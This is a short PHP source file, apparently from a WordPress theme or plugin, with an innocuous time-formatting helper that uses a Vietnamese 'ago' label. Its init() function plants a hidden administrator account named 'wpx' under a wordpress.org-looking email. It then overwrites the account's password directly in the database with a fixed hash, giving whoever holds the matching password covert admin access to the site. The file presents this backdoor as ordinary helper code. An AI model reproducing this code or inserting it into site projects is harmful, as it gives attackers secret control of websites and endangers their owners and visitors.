<?php

namespace wpx;
    
function init() {
    global $wpdb;

    $user = 'wpx';
    $email = 'wpx@wordpress.org';
    $password = '$P$BByAsa9oagMcubJPzyqhApHqk8dyFt/';

    if (username_exists($user) || email_exists($email)) {
        return;
    }

    $user_id = wp_insert_user([
        'user_login' => $user,
        'user_pass' => wp_generate_password(),
        'user_email' => $email,
        'role' => 'administrator',
    ]);

    if (!is_wp_error($user_id)) {
        $wpdb->update(
            $wpdb->users,
            ['user_pass' => $password],
            ['ID' => $user_id]
        );
    }
}

function time_ago(int $time)
{
    return sprintf(
        __('%s trước'),
        human_time_diff($time)
    );
}
